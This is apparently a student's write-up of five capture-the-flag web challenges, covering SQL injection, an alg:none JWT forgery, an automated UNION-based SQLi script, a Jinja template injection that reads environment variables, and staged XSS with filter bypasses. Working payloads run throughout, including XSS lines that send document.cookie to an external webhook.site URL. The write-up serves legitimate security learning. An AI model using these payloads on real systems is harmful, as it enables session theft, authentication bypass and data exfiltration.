# WEB EXPLOITATION

# 1. Database Incursion 2.0
>DESCRIPTION
Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

1. First, I access the website through the link given in the question.
2. From the name of the challenge, I had a doubt that this challenge has something to do with database, which means SQLI.
3. When I accessed the website and saw it was a login page, I somewhat took the path of SQLi to solve the above challenge, initially.
4. So, after some trial and error in injecting some sql injections , this sqli worked - ' OR '1'='1 . So, I got pass the first login window.
5. Following this we are presented with a screen where we can see details of various employees and search via name and the page also includes a field for entering admin password.
<img width="1911" height="770" alt="1 1" src="https://github.com/user-attachments/assets/e33a243b-6919-4e2d-8ff7-93dcad704008" />

6. But there was a clue that "someone from the management has the passcode". 
7. Inorder to sort the management employees accordingly, I passed the sqli - `' or department='Management'--`
8. This reveals another clue stating that an employee named 'Kiwi' has the password.
<img width="1913" height="872" alt="1 2" src="https://github.com/user-attachments/assets/7af5471d-b12b-4ee1-a814-8b349cd55fe2" />

9. By searching or querying, for 'Kiwi' we find 4 employees named Kiwi, whom is in management, I pass the sqli - `'or (department='Management' and name='Kiwi')--`
<img width="1916" height="876" alt="1 3" src="https://github.com/user-attachments/assets/5615fc37-7f07-4542-96bc-0807d46dc31d" />

10. This gives us the passcode for the next level.
11. We are directed to a admin panel, where we can run a report query and section named reports with columns and a metadata registry.
12. We know that this is an SQLi challenge. So, my plan was to mainly input SQLi payloads into the search area and get the secret stored in the metadata.
13. Before I got the right SQLi, I did multiple trial and errors and tried to make my way up.
a) simple auth bypasses - ' OR '1'='1' --
b) To Find number of columns - UNION SELECT NULL,NULL,NULL,NULL -- 
c) To Dump users (username:password) - ' UNION SELECT group_concat(username || ':' || password),NULL,NULL,NULL FROM users -- 
    which gave the output as kwA9gKGmXKYFi1MbB2WGwcNdwTstr7XM:PcnqmffOwMyV9D14N8HXzvAxlV6VuYZ9
14. Finally I passed the injection - `' UNION SELECT group_concat(secrets),NULL,NULL,NULL FROM CITADEL_ARCHIVE_2077 -- `, which Dump everything in the secrets column, by concatenating everything in that column, which revealed the flag!!
<img width="1901" height="851" alt="1 4" src="https://github.com/user-attachments/assets/410e8e0f-07b0-428c-84ba-99262aa2f6d9" />


## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts Learnt:
- Learnt a lot in the concepts of SQLi.
- UNION NULL,NULL.......... - UNION queries only work when column count matches, so you must know the exact number before extracting data.
- group_concat(column) - merges many rows into one string. It is super useful when the site shows only one row, letting you view all values at once (like the flag).

## References:
- https://portswigger.net/web-security/sql-injection - I used this to learn some of the SQLi concepts.

***


# 2. Temporal Token
>DESCRIPTION
I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

1. First, on accessing the website through the link provided, I could see a login portal, where we could enter the username and password.
2. Bcz I didn't get any immediate ideas on what to do, I started looking for clues.
3. I had some guesses on what this site is gonna do, as it is a login portal, it could be a client-side token or cookie to gate access OR The challenge name Temporal Token points at time-based / timestamped tokens or tamperable session tokens.
4. I deviated into multiple other ways like:
a) Looking into the storages in the application section of the site 
b) Referring to cookies and stuff 
5. Then, I got another clue like what does this response section of the website mean?? AND it is referring to some sort of error as well.
6. After a bit of digging, I understood that the server is looking for a cookie named token containing a bearer token and Itâ€™s rejecting us because that cookie is missing.
7. So, I understood this is some kind of JWT.
8. In order to pull of this, I decided to write a Java Script into the console of the site. The js :
```js
// create a simple alg:none JWT and set it as cookie named "token"
function b64url(s){ return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
const header = b64url(JSON.stringify({alg:"none",typ:"JWT"}));
const payload = b64url(JSON.stringify({username:"Belegar", exp: 9999999999}));
const token = header + "." + payload + "."; // try with and without trailing dot if needed
document.cookie = "token=" + token + "; path=/";
location.reload();
```
<img width="1897" height="826" alt="2 2" src="https://github.com/user-attachments/assets/f4e8d391-ba2b-44bb-8b71-f8b380d25b87" />

9. On executing this, it revealed the flag.
<img width="657" height="441" alt="2 1" src="https://github.com/user-attachments/assets/3e22eccd-409d-42b0-bcb4-545db4b25662" />


## Flag:
```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts Learnt:
- I was able to learn some of the concepts from the topic of JWT.
- Servers must always verify JWT signatures and never trust client-provided alg or payload. alg: none must always be rejected; signature verification must be enforced server-side.

## References:
https://www.jwt.io/ - I used this JWT decoder to construct the logic behind the JS and manually verifying it.

***

# 3. Oneshot
>DESCRIPTION
Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app

## Solution:
1. On opening the challenge, I accessed the website and downloaded the python code.
2. On analyzing the code, I understood that this challenge has something to do with SQLi. But we got only "oneshot" to get this right.
3. What I was able to understand was that we nneded to use SQLi to dump the random password (needed to get the flag).
4. Inorder to carry that out, I created a python code that does the above requirements and connects that to the website server to get the corresponding output for the input.
5. On many trial and error attempts that I did some of the outputs that I got is :
<img width="998" height="227" alt="3 0" src="https://github.com/user-attachments/assets/040e5ba3-b552-4568-9bfe-c21fee996da0" />

6. The correct version of the code to do this is, as shown below. And this revealed the FLAG !!!

CODE USED TO SOLVE:
```py
cat > get_flag.py <<'PY'
#!/usr/bin/env python3
# Final attempt: use UNION ALL and start with %' AND 1=0 so the original row is suppressed
# This tries to return 32 single-char rows (UNION ALL preserves duplicates).
import requests, re, html, sys

URL = "https://pacman-git-master-mrrobot404s-projects.vercel.app"

# 1) create new session
r = requests.post(URL + "/new_session")
m = re.search(r'value="([0-9a-f]{16})"', r.text)
if not m:
    print("Couldn't find session id. /new_session HTML:")
    print(r.text[:2000])
    sys.exit(1)
sid = m.group(1)
print("[*] session id:", sid)

# 2) payload: start with %' AND 1=0 to force original WHERE false,
# then UNION ALL substr(password,i,1) for i=1..32
parts = [f"UNION ALL SELECT substr(password,{i},1) FROM table_{sid}" for i in range(1,33)]
payload = "%' AND 1=0 " + " ".join(parts) + " -- "

# 3) send one-shot search
r2 = requests.post(URL + "/search", data={"id": sid, "query": payload})
if r2.status_code != 200:
    print("Search returned", r2.status_code)
    print(r2.text[:2000])
    sys.exit(1)

# 4) parse <li> results and keep only single-char rows
raw_items = re.findall(r"<li>(.*?)</li>", r2.text, flags=re.S)
items = [html.unescape(x).strip() for x in raw_items if x.strip()!='']
print("[*] Raw <li> entries:", items)
chars = [c for c in items if len(c) == 1]
print("[*] Single-char entries (count):", len(chars))
print("[*] Single-char entries:", chars)

if len(chars) != 32:
    print(f"[!] Warning: expected 32 chars but found {len(chars)}. Paste the Raw <li> entries here if it fails.")
password = "".join(chars)
print("[+] Recovered password:", password)

# 5) submit guess
r3 = requests.post(URL + "/guess", data={"id": sid, "password": password})
print("[+] /guess response:")
print(r3.text)
PY

python3 -m pip install --user requests >/dev/null 2>&1 || true
python3 get_flag.py
```
<img width="1723" height="222" alt="3 1" src="https://github.com/user-attachments/assets/b3608175-2d3e-441c-ad65-97d6f3ee4f63" />


## Flag:
```
nite{are_you_feeling_the_heat_now :)}
```
## Concepts Learnt:
- In this challenge I was able to learn some practical concepts on how to automate a required task, by using python code.
- In this challenge, we needed to extract <li> elements and filtered only the characters that mattered.This helps to automate flag extraction instead of manually copying 32 characters.

## References:
- https://realpython.com/python-requests/ - I used this to get some of my python code requirements.

***

# 4. Sweet Haven
>DESCRIPTION
 Sweet Haven 
 To build and start.
First `cd` into the `src` directory. Then run:
```bash
docker-compose up --build -d
```
The website will be accessible at http://localhost:1234

After solving locally, access the challenge server at http://sweethaven.nitephase.live:57889

## Solution:
1. First of all, I downloaded the zip file and extracted the src folder and I went through the files that was given in the src folder as part of the challenge.
2. Then, I went through the puthon code, app.py, and this is what I spotted in the code.
a) The code first inserts your review into a Jinja template, and then renders that output again as another Jinja template. This means any Jinja code that survives the first render will execute during the second render, which is a classic SSTI. Therefore, this is an SSTI challenge.
b) Our review is placed in a simple Jinga placeholder - ${}, so if we are able to input a malicious code in it, we will get the flag.
c) The regex blocked normal ways to inject ${...}, but the decoding step used unicode_escape. That decoding allows \N{DOLLAR SIGN} to become a real $, bypassing the check and letting us smuggle ${...} into the template.
d) The global object cycler (always present in Jinja) exposes its Python global namespace as cycler.__init__.__globals__.
From there, we can reach os.environ["FLAG"].
So putting ${cycler.__init__.__globals__.os.environ.FLAG} inside the review (using the unicode trick) forces the server to print the flag.
3. So, the payload that I came up with is : 
```
\N{DOLLAR SIGN}{cycler.__init__.__globals__.os.environ.FLAG}
```
4. On submitting this payload as the review, I got the flag in the customer review section.
5. First, I did this on the local host :
<img width="850" height="810" alt="4 1" src="https://github.com/user-attachments/assets/216e8b03-4a8a-4b44-a7f6-902c21ab2df7" />


Then I did it in the main website :
<img width="672" height="808" alt="4 2" src="https://github.com/user-attachments/assets/270f8326-18bd-436a-bc80-c1eefa9b6d24" />


## Flag:
```
Local: nite{f4k2_f1ag_bruh}
Main: nite{s5t1_w17h_un1c0d3_35c4p3_byp455}
```
## Concepts Learnt:
- Server-Side Template Injection (SSTI): SSTI happens when user input is interpreted as code inside template engines like Jinja.
- Unicode-escape bypassing (WAF bypass): Many challenges filter dangerous characters like $ or '. But Python's unicode_escape turns sequences like \N{DOLLAR SIGN} into $, letting you bypass filters in a safe-looking way. 
- CTF flags are often stored in environment variables. Once you gain code execution via SSTI, knowing to check os.environ is a common next step.

## References:
- https://portswigger.net/web-security/server-side-template-injection - I referred this to learn the concepts of SSTI
- https://book.hacktricks.wiki/en/index.html - I used this to learn some of the hacking aspects required in this challenge.
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2 - Repo for SSTIs

***


# 5. Why is it not called css
>DESCRIPTION
Why is it not called css
To build and start.
First `cd` into the `src` directory. Then run:
```bash
docker-compose up --build -d
```
The website will be accessible at http://localhost:56743

After solving locally, access the challenge server at http://whyisitnotcalledcss.nitephase.live:56743

## Solution:
1. From the title of the challenge itself, I got a hint. " Why is it not called css " - means XSS
2. I downloaded the zip file and extracted the src folder and I went through the files that was given in the src folder as part of the challenge
3. In the python code, app.py, code shows the bot sets a flag cookie at some point.
4. On further analysis, the python could be divided into 3 main parts, lets call it xss1, xss2, xss3
5. In xss1, the code is like:
```py
@app.route('/', methods=['GET', 'POST'])
def xss1():
    # ... no filtering logic ...
    return render_template("xss1.html", payload=payload)
```
6. The goal is to steal the cookie named xss2 which contains the path to the next level.
7. At xss2 part, we get xss3 part, by solving the function filter_2
```py
def filter_2(payload):
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```
8. At xss3 part, we get the flag!! For that, we need to solve the function filter_3
```py
def filter_3(payload):
    if "://" in payload.lower(): return "Nope"      # Bans http:// or https://
    if "document" in payload.lower(): return "Nope" # Bans document object
    if "cookie" in payload.lower(): return "Nope"   # Bans cookie property
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```
9. Now, I went through the application's architecture, to understand how to input the required input. We can make out 3 key points from it
a) base.html shows {{ payload|safe }}. The |safe filter is the main vulnerability, as it tells the template engine (Jinja2) not to escape the user's input, allowing raw HTML/JavaScript injection.
b) The injection happens inside a <p> tag, which means we can easily close the tag and introduce our own HTML elements like <script>.
c) app.py confirms the bot uses Playwright (Chromium) and visits the URL we provide via a POST request, setting a new cookie for the next stage each time. This confirms the multi-stage attack structure.
d) We need to use an external server to catch the cookies, as the bot is running headless inside a Docker container. For that I used webhook listner. 

10. Now, I setup the docker for this challenge and started doing my trial and errors on the local website. On entering the local website, I get this :
<img width="1853" height="825" alt="5 1" src="https://github.com/user-attachments/assets/6c292764-077c-463f-8264-931610faf423" />


11. For xss1 part, it has no server side effects. Since there are no filters, the simplest way to execute JavaScript and steal the cookie is the classic <script> tag. For that, Use JavaScript's window.location to redirect the bot's browser to our webhook URL, appending the stolen cookies (document.cookie) as a query parameter. 
This is the input to get xss2's cookie : 
```
<script>window.location='https://webhook.site/c79864bb-f799-4355-9ae9-b56ae447d078/?cookie='+document.cookie</script>
```
<img width="1902" height="877" alt="5 2" src="https://github.com/user-attachments/assets/15a0a3c7-837d-424d-8313-86a9eb703f89" />


12. The URL for the next XSS2 part is : `http://localhost:56743/bf2a73106a3a6328746782b8b47e4bd350e `. I got this website as a result 
<img width="1692" height="907" alt="5 3" src="https://github.com/user-attachments/assets/e17c0021-b6d5-4f26-9b6c-1f43ec9d7e50" />


13. From the description given, the website filters : the words "script", "img", and "svg" using payload.lower().replace(). But, Python's replace() function is not recursive. If we substitute the forbidden word with itself, the filter will remove the inner instance, leaving the correct one.

14. Therefore, Use nested tags to sneak the <script> tag past the filter. Thus, the payload that I passed is :
```
<scrscriptipt>window.location='https://webhook.site/c79864bb-f799-4355-9ae9-b56ae447d078?cookie='+document.cookie</scrscriptipt>
```
<img width="1467" height="692" alt="5 4" src="https://github.com/user-attachments/assets/45f8f25f-d664-4720-ac10-7f78981f75ce" />


15. The URL for XSS3 is : `http://localhost:56743/3e79c8a642j4hh2hbb7832384f043` . Which leads to this : 
<img width="1632" height="916" alt="5 5" src="https://github.com/user-attachments/assets/a6602310-0382-42d7-ab25-2f99e04aaf23" />


16. Here, the following stuff are filtered out:
a) ://: Blocks standard protocols (http://, https://).
b) document: Blocks the standard object for accessing cookies.
c) cookie: Blocks the property used to read the flag.
d) Still bans script, img, svg (requiring the nested tag bypass).

16. So, I passed a payload abiding these rules by implementing this : We can bypass the :// check by using a protocol-relative URL, which starts with // and tells the browser to use the current protocol AND We can bypass the document and cookie keyword checks by using JavaScript string concatenation and bracket notation to access the properties.

17. The payload that I passed : 
```
<scrscriptipt>window.location='//webhook.site/c79864bb-f799-4355-9ae9-b56ae447d078/?c='+window['doc'+'ument']['coo'+'kie']</scrscriptipt>
```
Which gave me the flag as the cookie : flag=N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}
<img width="1182" height="841" alt="5 6" src="https://github.com/user-attachments/assets/71006183-abfd-407d-b06a-ce1cdf2bf6e8" />


18. Therefore, This is the technique for solving this challenge !!!

19. I applied the same technique in the main website : http://whyisitnotcalledcss.nitephase.live:56743 . 

20. At the 3rd stage, I got the flag!!! - flag=nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
<img width="1121" height="926" alt="5 7" src="https://github.com/user-attachments/assets/c6642e03-c846-4b30-96b8-d6f3e3753566" />


## Flag:
```
Local : N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}
Main : nite{b3c4u53_c45c4d1n6_57yl3_5h3375_4lr34dy_3x1575}
```

## Concepts Learnt:
- XSS is not called CSS because the acronym was already taken by Cascading Style Sheets.
- I was able to learn a lot about the concepts of Reflected XSS (Cross-Site Scripting), Headless Browser Exploitation, Protocol-Relative URL Bypass and most importantly : PAYLOADS 

## References:
https://webhook.site/ - used this external server to catch the cookies, as the bot is running headless inside a Docker container.

***

